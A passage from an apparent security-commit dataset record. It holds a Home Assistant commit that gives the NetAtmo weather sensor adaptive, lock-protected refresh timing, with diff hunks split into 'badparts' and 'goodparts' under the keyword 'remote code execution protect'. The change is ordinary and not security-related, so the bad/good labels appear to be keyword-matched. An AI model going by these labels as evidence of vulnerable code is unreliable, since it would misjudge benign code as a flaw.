elif self.type == 'windangle':\n            if data['WindAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n        elif self.type == 'windstrength':\n            self._state = data['WindStrength']\n        elif self.type == 'gustangle_value':\n            self._state = data['GustAngle']\n        elif self.type == 'gustangle':\n            if data['GustAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n        elif self.type == 'guststrength':\n            self._state = data['GustStrength']\n        elif self.type == 'rf_status_lvl':\n            self._state = data['rf_status']\n        elif self.type == 'rf_status':\n            if data['rf_status'] >= 90:\n                self._state = \"Low\"\n            elif data['rf_status'] >= 76:\n                self._state = \"Medium\"\n            elif data['rf_status'] >= 60:\n                self._state = \"High\"\n            elif data['rf_status'] <= 59:\n                self._state = \"Full\"\n        elif self.type == 'wifi_status_lvl':\n            self._state = data['wifi_status']\n        elif self.type == 'wifi_status':\n            if data['wifi_status'] >= 86:\n                self._state = \"Low\"\n            elif data['wifi_status'] >= 71:\n                self._state = \"Medium\"\n            elif data['wifi_status'] >= 56:\n                self._state = \"High\"\n            elif data['wifi_status'] <= 55:\n                self._state = \"Full\"\n\n\nclass NetAtmoData(object):\n    \"\"\"Get the latest data from NetAtmo.\"\"\"\n\n    def __init__(self, auth, station):\n        \"\"\"Initialize the data object.\"\"\"\n        self.auth = auth\n        self.data = None\n        self.station_data = None\n        self.station = station\n\n    def get_module_names(self):\n        \"\"\"Return all module available on the API as a list.\"\"\"\n        self.update()\n        return self.data.keys()\n\n    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n    def update(self):\n        \"\"\"Call the Netatmo API to update the data.\"\"\"\n        import pyatmo\n        self.station_data = pyatmo.WeatherStationData(self.auth)\n\n        if self.station is not None:\n            self.data = self.station_data.lastData(\n                station=self.station, exclude=3600)\n        else:\n            self.data = self.station_data.lastData(exclude=3600)\n"}}, "msg": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting"}}, "https://github.com/sara0871/releases-": {"9ea0c409e6cea69cce632079548165ad5a9f2554": {"url": "https://api.github.com/repos/sara0871/releases-/commits/9ea0c409e6cea69cce632079548165ad5a9f2554", "html_url": "https://github.com/sara0871/releases-/commit/9ea0c409e6cea69cce632079548165ad5a9f2554", "message": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting", "sha": "9ea0c409e6cea69cce632079548165ad5a9f2554", "keyword": "remote code execution protect", "diff": "diff --git a/homeassistant/components/sensor/netatmo.py b/homeassistant/components/sensor/netatmo.py\nindex 191e587fe..bdc2c5990 100644\n--- a/homeassistant/components/sensor/netatmo.py\n+++ b/homeassistant/components/sensor/netatmo.py\n@@ -5,7 +5,8 @@\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n@@ -14,7 +15,6 @@\n     TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n@@ -24,8 +24,8 @@\n \n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n@@ -50,7 +50,8 @@\n     'rf_status': ['Radio', '', 'mdi:signal', None],\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n@@ -76,11 +77,11 @@ def setup_platform(hass, config, add_devices, discovery_info=None):\n             # Iterate each module\n             for module_name, monitored_conditions in\\\n                     config[CONF_MODULES].items():\n-                # Test if module exist \"\"\"\n+                # Test if module exists\n                 if module_name not in data.get_module_names():\n                     _LOGGER.error('Module name: \"%s\" not found', module_name)\n                     continue\n-                # Only create sensor for monitored \"\"\"\n+                # Only create sensors for monitored properties\n                 for variable in monitored_conditions:\n                     dev.append(NetAtmoSensor(data, module_name, variable))\n         else:\n@@ -285,6 +286,8 @@ def update(self):\n                 self._state = \"High\"\n             elif data['wifi_status'] <= 55:\n                 self._state = \"Full\"\n+        elif self.type == 'lastupdated':\n+            self._state = int(time() - data['When'])\n \n \n class NetAtmoData(object):\n@@ -296,20 +299,57 @@ def __init__(self, auth, station):\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "files": {"/homeassistant/components/sensor/netatmo.py": {"changes": [{"diff": "\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from datetime import timedelta"], "goodparts": ["from time import time", "import threading"]}, {"diff": "\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n", "add": 0, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from homeassistant.util import Throttle"], "goodparts": []}, {"diff": "\n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n", "add": 2, "remove": 2, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)"], "goodparts": ["NETATMO_UPDATE_INTERVAL = 600"]}, {"diff": "\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]"], "goodparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],", "    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],"]}, {"diff": "\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "add": 46, "remove": 9, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    @Throttle(MIN_TIME_BETWEEN_UPDATES)", "        \"\"\"Call the Netatmo API to update the data.\"\"\"", "        import pyatmo", "        self.station_data = pyatmo.WeatherStationData(self.auth)", "        if self.station is not None:", "            self.data = self.station_data.lastData(", "                station=self.station, exclude=3600)", "        else:", "            self.data = self.station_data.lastData(exclude=3600)"], "goodparts": ["        self._next_update = time()", "        self._update_in_progress = threading.Lock()", "        \"\"\"Call the Netatmo API to update the data.", "        This method is not throttled by the builtin Throttle decorator", "        but with a custom logic, which takes into account the time", "        of the last update from the cloud.", "        \"\"\"", "        if time() < self._next_update or \\", "                not self._update_in_progress.acquire(False):", "            return", "        try:", "            import pyatmo", "            self.station_data = pyatmo.WeatherStationData(self.auth)", "            if self.station is not None:", "                self.data = self.station_data.lastData(", "                    station=self.station, exclude=3600)", "            else:", "                self.data = self.station_data.lastData(exclude=3600)", "            newinterval = 0", "            for module in self.data:", "                if 'When' in self.data[module]:", "                    newinterval = self.data[module]['When']", "                    break", "            if newinterval:", "                newinterval += NETATMO_UPDATE_INTERVAL - time()", "                if newinterval > NETATMO_UPDATE_INTERVAL - 30:", "                    newinterval = NETATMO_UPDATE_INTERVAL", "                else:", "                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:", "                        newinterval = NETATMO_UPDATE_INTERVAL / 2", "                    _LOGGER.warning(", "                        \"NetAtmo refresh interval reset to %d seconds\",", "                        newinterval)", "            else:", "                newinterval = NETATMO_UPDATE_INTERVAL", "            self._next_update = time() + newinterval", "        finally:", "            self._update_in_progress.release()"]}], "source": "\n\"\"\" Support for the NetAtmo Weather Service. For more details about this platform, please refer to the documentation at https://home-assistant.io/components/sensor.netatmo/ \"\"\" import logging from datetime import timedelta import voluptuous as vol from homeassistant.components.sensor import PLATFORM_SCHEMA from homeassistant.const import( TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE, STATE_UNKNOWN) from homeassistant.helpers.entity import Entity from homeassistant.util import Throttle import homeassistant.helpers.config_validation as cv _LOGGER=logging.getLogger(__name__) CONF_MODULES='modules' CONF_STATION='station' DEPENDENCIES=['netatmo'] MIN_TIME_BETWEEN_UPDATES=timedelta(seconds=600) SENSOR_TYPES={ 'temperature':['Temperature', TEMP_CELSIUS, None, DEVICE_CLASS_TEMPERATURE], 'co2':['CO2', 'ppm', 'mdi:cloud', None], 'pressure':['Pressure', 'mbar', 'mdi:gauge', None], 'noise':['Noise', 'dB', 'mdi:volume-high', None], 'humidity':['Humidity', '%', None, DEVICE_CLASS_HUMIDITY], 'rain':['Rain', 'mm', 'mdi:weather-rainy', None], 'sum_rain_1':['sum_rain_1', 'mm', 'mdi:weather-rainy', None], 'sum_rain_24':['sum_rain_24', 'mm', 'mdi:weather-rainy', None], 'battery_vp':['Battery', '', 'mdi:battery', None], 'battery_lvl':['Battery_lvl', '', 'mdi:battery', None], 'min_temp':['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'max_temp':['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'windangle':['Angle', '', 'mdi:compass', None], 'windangle_value':['Angle Value', '\u00ba', 'mdi:compass', None], 'windstrength':['Strength', 'km/h', 'mdi:weather-windy', None], 'gustangle':['Gust Angle', '', 'mdi:compass', None], 'gustangle_value':['Gust Angle Value', '\u00ba', 'mdi:compass', None], 'guststrength':['Gust Strength', 'km/h', 'mdi:weather-windy', None], 'rf_status':['Radio', '', 'mdi:signal', None], 'rf_status_lvl':['Radio_lvl', '', 'mdi:signal', None], 'wifi_status':['Wifi', '', 'mdi:wifi', None], 'wifi_status_lvl':['Wifi_lvl', 'dBm', 'mdi:wifi', None] } MODULE_SCHEMA=vol.Schema({ vol.Required(cv.string): vol.All(cv.ensure_list,[vol.In(SENSOR_TYPES)]), }) PLATFORM_SCHEMA=PLATFORM_SCHEMA.extend({ vol.Optional(CONF_STATION): cv.string, vol.Optional(CONF_MODULES): MODULE_SCHEMA, }) def setup_platform(hass, config, add_devices, discovery_info=None): \"\"\"Set up the available Netatmo weather sensors.\"\"\" netatmo=hass.components.netatmo data=NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None)) dev=[] import pyatmo try: if CONF_MODULES in config: for module_name, monitored_conditions in\\ config[CONF_MODULES].items(): if module_name not in data.get_module_names(): _LOGGER.error('Module name: \"%s\" not found', module_name) continue for variable in monitored_conditions: dev.append(NetAtmoSensor(data, module_name, variable)) else: for module_name in data.get_module_names(): for variable in\\ data.station_data.monitoredConditions(module_name): if variable in SENSOR_TYPES.keys(): dev.append(NetAtmoSensor(data, module_name, variable)) else: _LOGGER.warning(\"Ignoring unknown var %s for mod %s\", variable, module_name) except pyatmo.NoDevice: return None add_devices(dev, True) class NetAtmoSensor(Entity): \"\"\"Implementation of a Netatmo sensor.\"\"\" def __init__(self, netatmo_data, module_name, sensor_type): \"\"\"Initialize the sensor.\"\"\" self._name='Netatmo{}{}'.format(module_name, SENSOR_TYPES[sensor_type][0]) self.netatmo_data=netatmo_data self.module_name=module_name self.type=sensor_type self._state=None self._device_class=SENSOR_TYPES[self.type][3] self._icon=SENSOR_TYPES[self.type][2] self._unit_of_measurement=SENSOR_TYPES[self.type][1] module_id=self.netatmo_data.\\ station_data.moduleByName(module=module_name)['_id'] self.module_id=module_id[1] @property def name(self): \"\"\"Return the name of the sensor.\"\"\" return self._name @property def icon(self): \"\"\"Icon to use in the frontend, if any.\"\"\" return self._icon @property def device_class(self): \"\"\"Return the device class of the sensor.\"\"\" return self._device_class @property def state(self): \"\"\"Return the state of the device.\"\"\" return self._state @property def unit_of_measurement(self): \"\"\"Return the unit of measurement of this entity, if any.\"\"\" return self._unit_of_measurement def update(self): \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\" self.netatmo_data.update() data=self.netatmo_data.data.get(self.module_name) if data is None: _LOGGER.warning(\"No data found for %s\", self.module_name) self._state=STATE_UNKNOWN return if self.type=='temperature': self._state=round(data['Temperature'], 1) elif self.type=='humidity': self._state=data['Humidity'] elif self.type=='rain': self._state=data['Rain'] elif self.type=='sum_rain_1': self._state=data['sum_rain_1'] elif self.type=='sum_rain_24': self._state=data['sum_rain_24'] elif self.type=='noise': self._state=data['Noise'] elif self.type=='co2': self._state=data['CO2'] elif self.type=='pressure': self._state=round(data['Pressure'], 1) elif self.type=='battery_lvl': self._state=data['battery_vp'] elif self.type=='battery_vp' and self.module_id=='6': if data['battery_vp'] >=5590: self._state=\"Full\" elif data['battery_vp'] >=5180: self._state=\"High\" elif data['battery_vp'] >=4770: self._state=\"Medium\" elif data['battery_vp'] >=4360: self._state=\"Low\" elif data['battery_vp'] < 4360: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='5': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='3': if data['battery_vp'] >=5640: self._state=\"Full\" elif data['battery_vp'] >=5280: self._state=\"High\" elif data['battery_vp'] >=4920: self._state=\"Medium\" elif data['battery_vp'] >=4560: self._state=\"Low\" elif data['battery_vp'] < 4560: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='2': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='min_temp': self._state=data['min_temp'] elif self.type=='max_temp': self._state=data['max_temp'] elif self.type=='windangle_value': self._state=data['WindAngle'] elif self.type=='windangle': if data['WindAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=0: self._state=\"N(%d\\xb0)\" % data['WindAngle'] elif self.type=='windstrength': self._state=data['WindStrength'] elif self.type=='gustangle_value': self._state=data['GustAngle'] elif self.type=='gustangle': if data['GustAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['GustAngle'] elif data['GustAngle'] >=0: self._state=\"N(%d\\xb0)\" % data['GustAngle'] elif self.type=='guststrength': self._state=data['GustStrength'] elif self.type=='rf_status_lvl': self._state=data['rf_status'] elif self.type=='rf_status': if data['rf_status'] >=90: self._state=\"Low\" elif data['rf_status'] >=76: self._state=\"Medium\" elif data['rf_status'] >=60: self._state=\"High\" elif data['rf_status'] <=59: self._state=\"Full\" elif self.type=='wifi_status_lvl': self._state=data['wifi_status'] elif self.type=='wifi_status': if data['wifi_status'] >=86: self._state=\"Low\" elif data['wifi_status'] >=71: self._state=\"Medium\" elif data['wifi_status'] >=56: self._state=\"High\" elif data['wifi_status'] <=55: self._state=\"Full\" class NetAtmoData(object): \"\"\"Get the latest data from NetAtmo.\"\"\" def __init__(self, auth, station): \"\"\"Initialize the data object.\"\"\" self.auth=auth self.data=None self.station_data=None self.station=station def get_module_names(self): \"\"\"Return all module available on the API as a list.\"\"\" self.update() return self.data.keys() @Throttle(MIN_TIME_BETWEEN_UPDATES) def update(self): \"\"\"Call the Netatmo API to update the data.\"\"\" import pyatmo self.station_data=pyatmo.WeatherStationData(self.auth) if self.station is not None: self.data=self.station_data.lastData( station=self.station, exclude=3600) else: self.data=self.station_data.lastData(exclude=3600) ", "sourceWithComments": "\"\"\"\nSupport for the NetAtmo Weather Service.\n\nFor more details about this platform, please refer to the documentation at\nhttps://home-assistant.io/components/sensor.netatmo/\n\"\"\"\nimport logging\nfrom datetime import timedelta\n\nimport voluptuous as vol\n\nfrom homeassistant.components.sensor import PLATFORM_SCHEMA\nfrom homeassistant.const import (\n    TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n    STATE_UNKNOWN)\nfrom homeassistant.helpers.entity import Entity\nfrom homeassistant.util import Throttle\nimport homeassistant.helpers.config_validation as cv\n\n_LOGGER = logging.getLogger(__name__)\n\nCONF_MODULES = 'modules'\nCONF_STATION = 'station'\n\nDEPENDENCIES = ['netatmo']\n\n# NetAtmo Data is uploaded to server every 10 minutes\nMIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n\nSENSOR_TYPES = {\n    'temperature': ['Temperature', TEMP_CELSIUS, None,\n                    DEVICE_CLASS_TEMPERATURE],\n    'co2': ['CO2', 'ppm', 'mdi:cloud', None],\n    'pressure': ['Pressure', 'mbar', 'mdi:gauge', None],\n    'noise': ['Noise', 'dB', 'mdi:volume-high', None],\n    'humidity': ['Humidity', '%', None, DEVICE_CLASS_HUMIDITY],\n    'rain': ['Rain', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_1': ['sum_rain_1', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_24': ['sum_rain_24', 'mm', 'mdi:weather-rainy', None],\n    'battery_vp': ['Battery', '', 'mdi:battery', None],\n    'battery_lvl': ['Battery_lvl', '', 'mdi:battery', None],\n    'min_temp': ['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'max_temp': ['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'windangle': ['Angle', '', 'mdi:compass', None],\n    'windangle_value': ['Angle Value', '\u00ba', 'mdi:compass', None],\n    'windstrength': ['Strength', 'km/h', 'mdi:weather-windy', None],\n    'gustangle': ['Gust Angle', '', 'mdi:compass', None],\n    'gustangle_value': ['Gust Angle Value', '\u00ba', 'mdi:compass', None],\n    'guststrength': ['Gust Strength', 'km/h', 'mdi:weather-windy', None],\n    'rf_status': ['Radio', '', 'mdi:signal', None],\n    'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n    'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n}\n\nMODULE_SCHEMA = vol.Schema({\n    vol.Required(cv.string):\n        vol.All(cv.ensure_list, [vol.In(SENSOR_TYPES)]),\n})\n\nPLATFORM_SCHEMA = PLATFORM_SCHEMA.extend({\n    vol.Optional(CONF_STATION): cv.string,\n    vol.Optional(CONF_MODULES): MODULE_SCHEMA,\n})\n\n\ndef setup_platform(hass, config, add_devices, discovery_info=None):\n    \"\"\"Set up the available Netatmo weather sensors.\"\"\"\n    netatmo = hass.components.netatmo\n    data = NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None))\n\n    dev = []\n    import pyatmo\n    try:\n        if CONF_MODULES in config:\n            # Iterate each module\n            for module_name, monitored_conditions in\\\n                    config[CONF_MODULES].items():\n                # Test if module exist \"\"\"\n                if module_name not in data.get_module_names():\n                    _LOGGER.error('Module name: \"%s\" not found', module_name)\n                    continue\n                # Only create sensor for monitored \"\"\"\n                for variable in monitored_conditions:\n                    dev.append(NetAtmoSensor(data, module_name, variable))\n        else:\n            for module_name in data.get_module_names():\n                for variable in\\\n                        data.station_data.monitoredConditions(module_name):\n                    if variable in SENSOR_TYPES.keys():\n                        dev.append(NetAtmoSensor(data, module_name, variable))\n                    else:\n                        _LOGGER.warning(\"Ignoring unknown var %s for mod %s\",\n                                        variable, module_name)\n    except pyatmo.NoDevice:\n        return None\n\n    add_devices(dev, True)\n\n\nclass NetAtmoSensor(Entity):\n    \"\"\"Implementation of a Netatmo sensor.\"\"\"\n\n    def __init__(self, netatmo_data, module_name, sensor_type):\n        \"\"\"Initialize the sensor.\"\"\"\n        self._name = 'Netatmo {} {}'.format(module_name,\n                                            SENSOR_TYPES[sensor_type][0])\n        self.netatmo_data = netatmo_data\n        self.module_name = module_name\n        self.type = sensor_type\n        self._state = None\n        self._device_class = SENSOR_TYPES[self.type][3]\n        self._icon = SENSOR_TYPES[self.type][2]\n        self._unit_of_measurement = 